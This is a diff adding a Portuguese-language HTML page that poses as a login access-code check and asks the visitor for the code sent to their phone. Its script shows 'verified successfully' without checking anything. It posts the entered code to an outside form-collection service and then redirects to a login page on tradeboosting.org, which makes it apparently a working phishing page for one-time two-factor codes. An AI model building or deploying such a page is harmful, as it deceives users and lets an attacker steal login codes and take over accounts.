@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Verificação de Código de Acesso</title>
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            background-color: #f7f7f7;
+        }
+        .verification-container {
+            background-color: white;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+        }
+        h2 {
+            font-size: 18px;
+            margin-bottom: 15px;
+        }
+        .input-group {
+            margin-bottom: 15px;
+        }
+        input {
+            width: 100%;
+            padding: 10px;
+            border-radius: 4px;
+            border: 1px solid #ccc;
+            font-size: 16px;
+        }
+        button {
+            width: 100%;
+            padding: 10px;
+            background-color: #4CAF50;
+            border: none;
+            color: white;
+            font-size: 16px;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #45a049;
+        }
+        .message-container {
+            display: none;
+            padding: 20px;
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
+            width: 300px;
+            text-align: center;
+            margin-top: 20px;
+        }
+        .message-container p {
+            color: green;
+            font-size: 16px;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="verification-container">
+        <h2>Informe aqui o código de acesso enviado ao seu telefone para fazer login</h2>
+        <form id="verificationForm">
+            <div class="input-group">
+                <input type="text" id="codigo" name="codigo" placeholder="Digite o código" required>
+            </div>
+            <button type="submit">Verificar autenticação</button>
+        </form>
+    </div>
+
+    <div class="message-container" id="messageContainer">
+        <p>Código verificado com sucesso! Acesso concedido.</p>
+    </div>
+
+    <script>
+        document.getElementById('verificationForm').addEventListener('submit', function(event) {
+            event.preventDefault(); // Impede o envio padrão do formulário
+
+            // Exibe a mensagem de sucesso
+            document.getElementById('messageContainer').style.display = 'block';
+
+            // Coleta os dados do formulário
+            const formData = new FormData(this);
+
+            // Envia os dados para o Formspree ou algum outro serviço de verificação
+            fetch('https://formspree.io/f/mnnnkgwe', {
+                method: 'POST',
+                body: formData,
+                headers: {
+                    'Accept': 'application/json'
+                }
+            }).then(response => {
+                // Atraso e redirecionamento após a verificação
+                setTimeout(function() {
+                    alert('Autenticação bem-sucedida! Você será redirecionado para a página de login.');
+                    window.location.href = "https://tradeboosting.org/app/login.php";
+                }, 2000);
+            }).catch(error => {
+                console.error('Erro ao enviar o formulário:', error);
+            });
+        });
+    </script>
+
+</body>
+</html>
